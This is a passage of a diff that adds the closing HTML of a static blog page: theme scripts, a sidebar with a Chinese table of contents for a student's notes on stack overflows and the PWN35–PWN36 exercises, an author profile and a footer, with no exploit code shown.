+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%C2%B7%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">·栈溢出的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E4%BB%A5%E5%8F%8A%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.0.1.</span> <span class="nav-text">栈以及栈的结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN35"><span class="nav-number">1.1.</span> <span class="nav-text">PWN35</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">后门函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%A0%86%E6%A0%88%E7%BB%93%E6%9E%84%E4%B8%8E%E5%81%8F%E7%A7%BB%E9%87%8F%E7%9A%84%E6%9D%A5%E6%BA%90"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.堆栈结构与偏移量的来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%BA%95%E5%B1%82%E9%80%BB%E8%BE%91"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.函数调用的底层逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">返回值的本质</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">返回值的底层实现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88call%E6%8C%87%E4%BB%A4%EF%BC%89"><span class="nav-number">2.0.2.2.1.</span> <span class="nav-text">1.调用函数（call指令）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%EF%BC%88ret%E6%8C%87%E4%BB%A4%EF%BC%89"><span class="nav-number">2.0.2.3.</span> <span class="nav-text">2.函数返回（ret指令）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">2.0.2.3.1.</span> <span class="nav-text">3.栈溢出</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN36"><span class="nav-number">3.</span> <span class="nav-text">PWN36</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="GhostFoxy"
+      src="/images/IMG_0126.JPG">
+  <p class="site-author-name" itemprop="name">GhostFoxy</p>
+  <div class="site-description" itemprop="description">网络安全专业大学生的学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">GhostFoxy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
